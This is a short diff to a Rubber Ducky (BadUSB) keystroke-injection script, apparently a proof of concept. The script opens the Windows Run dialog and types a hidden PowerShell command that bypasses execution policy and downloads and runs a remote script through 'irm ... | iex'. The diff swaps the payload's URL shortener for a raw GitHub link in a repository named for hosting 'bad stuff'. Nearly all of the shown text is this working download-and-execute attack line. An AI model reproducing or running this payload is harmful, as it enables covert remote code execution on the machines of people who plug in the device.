@@ -26,5 +26,5 @@ REM ____________________________________________________________________________
 DELAY 2000
 GUI r
 DELAY 1000
-STRING powershell -w h -NoP -Ep Bypass irm https://shorturl.at/CmoDf | iex
+STRING powershell -w h -NoP -Ep Bypass irm https://raw.githubusercontent.com/Gvte-Kali/BadStuffHosting/refs/heads/main/BadUSB/RubberDucky_PoC/RubberDucky_PoC.ps1 | iex
 ENTER
